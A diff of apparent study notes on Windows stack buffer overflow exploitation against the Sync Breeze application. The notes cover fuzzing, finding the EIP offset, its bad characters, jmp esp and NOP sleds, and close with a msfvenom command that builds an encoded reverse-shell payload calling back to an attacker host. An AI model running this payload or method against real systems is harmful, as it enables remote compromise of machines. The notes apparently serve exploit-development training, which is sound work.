@@ -1,34 +1,54 @@
+======
+target
+======
+A : filler
+B : shellcode address
+C : shellcode
+0 : NOPS
+eax AAAA
+    AAAA
+eip BBBB
+esp 0000
+    0000
+    CCCC
+
+esp : the top of stack
+	jmp esp
+	
+
 =============================
 discovering the vulnerability
 =============================
 sourcode review : easy
 fuzzing
-	HTTP form
-		./fuzzer.py <request file> <host ip> <target form tag name> <start length> <step size> <end length>
+	can send payload through HTTP form
 
-=====================
-replicating the crash
-=====================
-It's included in fuzzer.py
+==================================
+replicating the crash(find offset)
+==================================
+it's included in findOffset
 
 =================
 find EIP location
 =================
 binary tree analysis
-	binary search
+	binary search; slow
 non-repeatig 4-byte thunks
 	msf-pattern_create -l <length>
 	msf-pattern_offset -l <length> -q <overwrited EIP>
+	it's included in automate/create_payload & automate/create_exploit
 
 =======
 exploit
 =======
-1. fill the buffer
-2. fill the EIP
+1. replicating the crash
+	find offset by sending pattern
+2. controlling the EIP
+	4 bytes after the offset
 3. checking for bad characters
 	removing bad characters
 	 : bad character makes ESP dump part suddenly stopped with filled with null byte
-		\x00\x0a\x0d\x25\x26\x2b\x3d
+		sync breeze : \x00\x0a\x0d\x25\x26\x2b\x3d
 4. redirecting the execution flow
 	now, the hard coded address doesn't work. So go to next.
 5. finding a return address
@@ -44,3 +64,7 @@ exploit
 	add GetPC routine
 	  : add NOPs that means just passing to next command
 8. improving the exploit
+	sync breeze is threaded application
+	we can bypass the whole application's crash using ExitThread api
+		just add EXITFUNC=thread on mefvenom command's option
+			--> msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<listening port> EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"			
